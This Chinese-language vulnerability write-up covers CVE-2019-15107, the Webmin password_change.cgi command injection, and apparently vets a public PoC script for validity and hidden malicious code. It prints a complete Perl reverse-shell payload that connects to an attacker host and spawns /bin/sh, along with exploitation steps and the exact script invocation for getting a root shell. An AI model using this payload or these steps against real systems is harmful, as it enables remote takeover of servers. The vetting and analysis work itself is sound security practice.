## CVE-2019-15107 Webmin password_change.cgi 命令注入

**漏洞编号:** CVE-2019-15107

**漏洞类型:** 命令注入

**影响应用:** Webmin

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 1.920

**利用条件:** 目标主机运行存在漏洞的Webmin版本，且password_change.cgi可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-15107是一个存在于Webmin <=1.920的命令注入漏洞。具体来说，`/password_change.cgi` 脚本中的 `old` 参数存在漏洞，攻击者可以通过构造恶意的 `old` 参数来执行任意系统命令。由于Webmin通常以root权限运行，成功利用此漏洞可能导致完全控制受影响的系统。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，可以判断此POC代码是有效的。漏洞库信息明确指出该漏洞存在于 Webmin <= 1.920 的 `/password_change.cgi` 中。搜索引擎结果中也包含多个验证了该漏洞的页面，如 Rapid7 的漏洞描述和 Tenable 的漏洞利用模块可用性报告。提供的 Python 脚本 `webmin_rce.py` 实现了漏洞利用过程，包括版本检测和特定版本 Payload 的构造。

**投毒风险分析：**

对提供的 Python 脚本 `webmin_rce.py` 进行了分析。代码的主要功能是利用 Webmin 的命令注入漏洞，并未发现明显的恶意代码，例如删除系统文件、安装恶意软件等。但是，任何远程代码执行漏洞都有可能被利用于恶意目的。因此，脚本本身虽然没有明显的投毒代码，但使用该脚本对目标系统进行渗透测试或攻击可能带来潜在的风险。脚本的README文档中描述了使用方法。

对shell_payload进行分析，此payload主要作用是反弹shell，如果被替换成其他的payload可能会造成投毒风险。

脚本中使用的反弹shell payload为：
```perl
perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

脚本中存在通过 `-l` 和 `-p` 参数自定义 LHOST 和 LPORT 的功能，这使得攻击者可以灵活地指定反弹 shell 的目标地址。如果作者将shell_payload替换成恶意payload,将会存在恶意投毒风险.

综合考虑，将投毒风险评定为10%。

**利用方式：**

1.  **确定目标 Webmin 版本：**  通过访问 `/password_change.cgi` 并观察响应，或者通过其他方式确定目标 Webmin 的版本。
2.  **构造恶意请求：**  根据 Webmin 的版本，构造包含恶意命令的 HTTP POST 请求，将命令注入到 `old` 参数中。
3.  **发送请求：**  将构造好的请求发送到 `/password_change.cgi`。
4.  **执行命令：**  Webmin 执行注入的命令。
5.  **获取权限：**  如果命令执行成功，攻击者可以获得对目标系统的控制权，例如通过反弹 shell。

**脚本 `webmin_rce.py` 的利用步骤：**

1.  使用 `python3 webmin_rce.py -t <target_url> -l <lhost> -p <lport>` 命令运行脚本，替换 `<target_url>` 为目标 Webmin 的 URL，`<lhost>` 为攻击者监听的 IP 地址，`<lport>` 为攻击者监听的端口。
2.  脚本会自动检测 Webmin 版本并构造相应的 payload。
3.  如果漏洞存在且利用成功，攻击者将在监听端口上获得一个 root shell。

**项目地址:** [MasterCode112/CVE-2019-15107](https://github.com/MasterCode112/CVE-2019-15107)

**漏洞详情:** [CVE-2019-15107](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)